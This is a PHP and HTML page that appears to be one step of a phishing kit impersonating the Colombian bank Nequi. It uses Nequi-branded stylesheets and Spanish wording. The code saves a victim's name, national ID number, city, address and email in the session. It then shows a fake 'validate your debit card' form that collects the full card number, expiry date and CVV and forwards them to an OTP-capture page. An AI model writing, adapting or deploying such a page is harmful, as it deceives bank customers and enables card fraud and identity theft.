<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $_SESSION["nombre"] = $_POST["nombre"] ?? '';
    $_SESSION["cedula"] = $_POST["cedula"] ?? '';
    $_SESSION["ciudad"] = $_POST["ciudad"] ?? '';
    $_SESSION["dir"]    = $_POST["dir"] ?? '';
    $_SESSION["email"]  = $_POST["email"] ?? '';
} else {
    header("Location: ../login.html");
    exit;
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Validar Tarjeta</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- ✅ rutas corregidas -->
    <link rel="stylesheet" type="text/css" href="../assets/css/normalize.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/nequi_two.webflow.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/nequi_one.webflow.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/main.css">
</head>
<body>
    <div class="container">
        <h2>Validar Tarjeta Débito</h2>
        <p class="ng-binding">Ingresa los datos de tu tarjeta Nequi para continuar.</p>

        <!-- 🔹 envía a otp.php -->
        <form method="POST" action="otp.php" autocomplete="off">
            <div class="form-group">
                <input type="text" name="numero_tarjeta" placeholder="Número de Tarjeta" maxlength="16" minlength="16" required>
            </div>
            <div class="form-group">
                <input type="text" name="fecha_vencimiento" placeholder="MM/AA" maxlength="5" minlength="5" required>
            </div>
            <div class="form-group">
                <input type="text" name="cvv" placeholder="CVV" maxlength="3" minlength="3" required>
            </div>

            <div class="btn-wrap">
                <input class="form-btn-submit" type="submit" value="Validar">
            </div>
        </form>
    </div>

    <!-- ✅ script -->
    <script src="../assets/js/script.js"></script>
</body>
</html>
